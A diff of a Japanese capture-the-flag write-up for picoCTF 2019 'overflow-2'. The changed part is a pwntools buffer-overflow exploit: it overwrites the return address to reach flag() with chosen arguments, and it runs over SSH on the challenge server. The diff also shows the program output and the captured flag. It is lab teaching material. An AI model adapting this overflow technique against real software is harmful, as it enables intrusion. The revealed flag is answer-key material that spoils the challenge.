@@ -57,26 +57,34 @@ int main(int argc, char **argv){
 `flag()`内で2回目のbofし、`arg1`と`arg2`の変数の中身をそれぞれ`0xDEADBEEF`と`0xC0DED00D`に書き換えてやればよい
 
 ```python
-from pwn import *
-
-pad_buf = 'A'*176
-pad_flg = 'A'*64
+from pwn import *                                                                        
+padding = 'A'*188
 
 arg1_addr = p32(0xDEADBEEF)
 arg2_addr = p32(0xC0DED00D)
 
 flag_addr = p32(0x080485e6)
 
-exploit = pad_buf + flag_addr
+exploit = padding + flag_addr + p32(1) + arg1_addr + arg2_addr
 print(exploit)
 
-io = process('./vuln')
+#io = process('./vuln')
+sh = ssh(host='2019shell1.picoctf.com', user='99999', password="****************")
+io = sh.run("cd /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc;./vuln")
 io.sendline(exploit)
 
-exploit = pad_flg + arg2_addr + arg1_addr
-print(exploit)
-print(io.recv())
-
-io.sendline(exploit)
 print(io.recvall())
+```
+
+実行する
+
+```shell
+$ python exploit.py
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[+] Connecting to 2019shell1.picoctf.com on port 22: Done                                [*] 99999@2019shell1.picoctf.com:                                                            Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64                                                                          Version:  4.15.0
+    ASLR:     Enabled                                                                    [+] Opening new channel: 'cd /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc;./vuln': Done                                                                                [+] Receiving all data: Done (321B)                                                      [*] Closed SSH channel with 2019shell1.picoctf.com                                       Please enter your string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+picoCTF{arg5_and_r3turn5e919413c}bash: line 1: 3992811 Segmentation fault      (core dumped) ./vuln
 ```
